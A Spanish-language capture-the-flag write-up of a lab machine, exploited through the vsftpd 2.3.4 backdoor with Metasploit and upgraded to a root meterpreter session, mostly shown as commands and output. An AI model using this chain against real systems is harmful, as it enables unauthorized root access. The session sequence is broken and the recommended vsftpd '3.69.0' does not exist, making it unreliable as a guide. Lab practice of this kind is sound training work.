# SOLUCION-MAQUINA-TPROOT
Esta maquina/laboratorio controlado,la ,se accede con una backdor (xeploit) , despues se inicia con una session de meterpeter ,y de ahi escalar privilegios para ser root  

1. RECONOCIMIENTO
-utilizamos  nmap con el siguiente comando para descubrir versiones y puertos :


        nmap -T5 -sVC 172.17.0.2
        Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-26 17:56 -04
        Nmap scan report for 172.17.0.2
        Host is up (0.000012s latency).
        Not shown: 998 closed tcp ports (reset)
        PORT   STATE SERVICE VERSION
        21/tcp open  ftp     vsftpd 2.3.4
        |_ftp-anon: got code 500 "OOPS: cannot change directory:/var/ftp".
        80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
        |_http-server-header: Apache/2.4.58 (Ubuntu)
        |_http-title: Apache2 Ubuntu Default Page: It works
        MAC Address: 02:42:AC:11:00:02 (Unknown)
        Service Info: OS: Unix
a primera vista, la version del sercvicio 21 (ftp) es bastante desactualizada (2011), esta tiene una problema de seguridad , pero antes veremos que podemos encontrar en el sitio web.

2.EXPLOTACION
------------
hicimos un fuzzing web y no encontramos ningun directorio, asi que abri msf console para buscar si hay algun exploit para poder acceder a ella:
search vsftpd 2.3.4

    Matching Modules
    ================
    
       #  Name                                  Disclosure Date  Rank       Check  Description
       -  ----                                  ---------------  ----       -----  -----------
       0  ###################################    2011-07-03       excellent  No     ####################
    
    
    Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
    
    msf > use 0
    [*] No payload configured, defaulting to cmd/unix/interact
    msf exploit(#########################) > use 0 
    
    
    msf exploit(#########################) > set RHOSTS 172.17.0.2
    RHOSTS => 172.17.0.2
    msf exploit(#########################) > show options
    
    Module options (#########################):
    
       Name    Current Setting  Required  Description
       ----    ---------------  --------  -----------
       RHOSTS  172.17.0.2       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
       RPORT   21               yes       The target port (TCP)
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Automatic
    
    
    
    View the full module info with the info, or info -d command.

una vez cargado lo que pide el exploit , es momento de ejecutar
    
    msf exploit(####################) > run
    [*] 172.17.0.2:21 - Banner: 220 (vsFTPd 2.3.4)
    [*] 172.17.0.2:21 - USER: 331 Please specify the password.
    [+] 172.17.0.2:21 - Backdoor service has been spawned, handling...
    [+] 172.17.0.2:21 - UID: uid=0(root) gid=0(root) groups=0(root)
    [*] Found shell.
    ls
    
    [*] Command shell session 1 opened (172.17.0.1:33241 -> 172.17.0.2:6200) at 2025-12-26 18:00:53 -0400
la maquina ya esta comprometida, pero tenemos una session de shell, esta es una sesion que es mucho menos compleja a nivel de los comandos que podemos ejecutar para escalar privilegios. asi que vamos a iniciar
una sesion de meterpretter para tener un mayor poder para ejecutar comandos y ser root

Para esto buscamos con msfconsole algo que podamos usar , vemos lo que necesita , y ejecutamos :

        Background session 1? [y/N]  y
        msf exploit(####################) > search shell_to_meterpreter
        
        Matching Modules
        ================
        
           #  Name                                    Disclosure Date  Rank    Check  Description
           -  ----                                    ---------------  ----    -----  -----------
           0  ####################   .                normal  No     Shell to Meterpreter Upgrade
        
        
        Interact with a module by name or index. For example info 0, use 0 or use ####################
        
        msf exploit(####################) > use 0
        msf post(####################) > show options
        
        Module options (####################):
        
           Name     Current Setting  Required  Description
           ----     ---------------  --------  -----------
           HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
           LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
           LPORT    4433             yes       Port for payload to connect to.
           SESSION                   yes       The session to run this module on
        
        
        View the full module info with the info, or info -d command.
        
        msf post(####################) > sessions -l
        
        Active sessions
        ===============
        
          Id  Name  Type            Information  Connection
          --  ----  ----            -----------  ----------
          1         shell cmd/unix               172.17.0.1:33241 -> 172.17.0.2:6200 (172.17.0.2)
        
        msf post(####################) > use 1
        [-] Invalid module index: 1
        msf post(####################) > set SESSION 1
        SESSION => 1
        msf post(####################) > sessions -i 2 
        [*] Starting interaction with 2...
        
        meterpreter > ls
        Listing: /tmp/vsftpd-2.3.4-infected/port
        ========================================
        
        meterpreter > cd ..
        meterpreter > ls
        Listing: /tmp
        =============
        
        Mode              Size  Type  Last modified              Name
        ----              ----  ----  -------------              ----
        040755/rwxr-xr-x  4096  dir   2025-02-03 06:21:37 -0400  vsftpd-2.3.4-infected

        meterpreter > cd ..
    meterpreter > ls
    Listing: /
una vez estando dentro de la maquina, ya somos el usuario root con este tipo de sesion.
    ==========
    
    Mode              Size  Type  Last modified              Name
    ----              ----  ----  -------------              ----
    100755/rwxr-xr-x  0     fil   2025-12-26 17:56:05 -0400  .dockerenv
    040755/rwxr-xr-x  4096  dir   2025-02-03 06:16:59 -0400  bin
    040755/rwxr-xr-x  4096  dir   2024-04-22 09:08:03 -0400  boot
    040755/rwxr-xr-x  340   dir   2025-12-26 17:56:05 -0400  dev
    040755/rwxr-xr-x  4096  dir   2025-12-26 17:56:05 -0400  etc
    040755/rwxr-xr-x  4096  dir   2024-11-19 05:52:47 -0400  home
    040755/rwxr-xr-x  4096  dir   2025-02-03 06:16:58 -0400  lib
    040755/rwxr-xr-x  4096  dir   2023-10-01 00:19:41 -0400  lib.usr-is-merged
    040755/rwxr-xr-x  4096  dir   2024-11-19 05:52:35 -0400  lib64
    040755/rwxr-xr-x  4096  dir   2024-11-19 05:46:01 -0400  media
    040755/rwxr-xr-x  4096  dir   2024-11-19 05:46:01 -0400  mnt
    040755/rwxr-xr-x  4096  dir   2024-11-19 05:46:01 -0400  opt
    040555/r-xr-xr-x  0     dir   2025-12-26 17:56:05 -0400  proc
    040700/rwx------  4096  dir   2025-02-03 06:25:57 -0400  root
    040755/rwxr-xr-x  4096  dir   2025-02-03 06:31:37 -0400  run
    040755/rwxr-xr-x  4096  dir   2025-02-03 06:16:58 -0400  sbin
    040755/rwxr-xr-x  4096  dir   2024-11-19 05:46:01 -0400  srv
    040555/r-xr-xr-x  0     dir   2025-12-26 17:56:05 -0400  sys
    041777/rwxrwxrwx  4096  dir   2025-12-26 18:05:59 -0400  tmp
    040755/rwxr-xr-x  4096  dir   2024-11-19 05:46:01 -0400  usr
    040755/rwxr-xr-x  4096  dir   2025-02-03 06:15:21 -0400  var
    
    meterpreter > cd root
    meterpreter > ls
    Listing: /root
    ==============
    
    Mode              Size  Type  Last modified              Name
    ----              ----  ----  -------------              ----
    100644/rw-r--r--  3106  fil   2024-04-22 09:04:27 -0400  .bashrc
    040755/rwxr-xr-x  4096  dir   2025-02-02 07:24:22 -0400  .local
    100644/rw-r--r--  161   fil   2024-04-22 09:04:27 -0400  .profile
    100644/rw-r--r--  33    fil   2025-02-03 06:25:57 -0400  root.txt
    
RECOMENDACIONES: Actualizar la version del de servicio ftp (vsftpd 2.3.4) a la 3.69.0 
    
